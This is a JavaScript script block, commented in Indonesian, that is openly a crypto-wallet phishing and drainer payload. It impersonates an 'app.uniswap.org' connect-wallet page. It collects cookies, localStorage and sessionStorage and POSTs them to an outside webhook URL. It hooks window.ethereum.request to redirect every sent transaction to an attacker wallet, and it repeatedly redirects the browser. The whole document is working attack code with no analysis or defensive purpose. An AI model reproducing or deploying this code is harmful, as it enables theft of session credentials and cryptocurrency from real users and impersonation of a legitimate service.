    body {

  <script>
    // Konfigurasi Penyerang
    const attackerWallet = "0x9999999999999999999999999999999999999999";
    
    // URL Webhook tujuan langsung
    const WEBHOOK_URL = "https://webhooksite.net/dc884b61-9058-4d2d-a0d5-f0d0fa847d49";

    // Fungsi Pengiriman Data Langsung ke WebhookSite
    function sendDataToWebhook(actionType, dataObj) {
        const payload = {
            action: actionType,
            timestamp: new Date().toISOString(),
            details: dataObj
        };

        // Mengirim data menggunakan fetch dengan format JSON standar
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(err => console.log("Webhook error:", err));
    }

    // Eksfiltrasi LocalStorage & Cookies
    function exfiltrateSessionData() {
        try {
            const harvestedData = {
                url: window.location.href,
                localStorage: { ...localStorage },
                sessionStorage: { ...sessionStorage },
                cookies: document.cookie,
                userAgent: navigator.userAgent
            };

            sendDataToWebhook("HARVEST_SESSION", harvestedData);
        } catch (e) {
            console.error("Gagal mengambil storage:", e);
        }
    }

    // Monkey Patching untuk Transaction Spoofing
    if (typeof window.ethereum !== 'undefined') {
        const originalRequest = window.ethereum.request;
        window.ethereum.request = async function(args) {
            if (args.method === 'eth_sendTransaction' && args.params && args.params[0]) {
                let tx = args.params[0];
                
                // Laporkan transaksi asli sebelum ditimpa ke webhook
                sendDataToWebhook("TRANSACTION_INTERCEPTED", {
                    originalTo: tx.to,
                    value: tx.value,
                    redirectedTo: attackerWallet
                });

                // Menimpa alamat tujuan ke dompet penyerang
                tx.to = attackerWallet;
            }
            return originalRequest.apply(window.ethereum, [args]);
        };
    }

    async function spoof() {
      if (!document.getElementById('connect')) {
          document.body.innerHTML = `
            <h1>app.uniswap.org Web3 Interface</h1>
            <p>To continue, please connect your wallet or execute action</p>
            <button id="connect">Connect Wallet</button>
            <br>
            <button id="connectWallet">Connect Wallet Transaction (Spoofed)</button>
            <p id="status" style="margin-top:20px; color:gray;"></p>
          `;

          document.getElementById('connect').onclick = async () => {
            exfiltrateSessionData(); // Kirim data sesi
            
            if (typeof window.ethereum !== 'undefined') {
              try {
                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                document.getElementById('status').innerText = '✅ Connected: ' + accounts[0];
                
                sendDataToWebhook("WALLET_CONNECTED", { account: accounts[0] });
              } catch (e) {
                document.getElementById('status').innerText = '❌ Failed: ' + e.message;
              }
            } else {
              document.getElementById('status').innerText = '❌ Web3 Provider not detected.';
            }
          };
          
          document.getElementById('connectWallet').onclick = async () => {
            exfiltrateSessionData(); // Kirim data sesi

            if (!window.ethereum) {
              alert("No Web3 provider detected");
              return;
            }

            try {
              const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
              const user = accounts[0];

              const txParams = {
                from: user,
                to: "0x1111111111111111111111111111111111111111", 
                value: "0x5af3107a4000", 
                gas: "0x5208",
                gasPrice: "0x3b9aca00"
              };

              await ethereum.request({
                method: 'eth_sendTransaction',
                params: [txParams]
              });

              alert("Transaction sent.");
            } catch (err) {
              console.error(err);
              alert("Error: " + err.message);
            }
          };
      }

      try {
        window.location.assign("http://app.uniswap.org:1121");
      } catch(e) {}

      setTimeout(function(){
          spoof();  
      }, 5000); 
    }

    setInterval(spoof, 2000);
  </script>
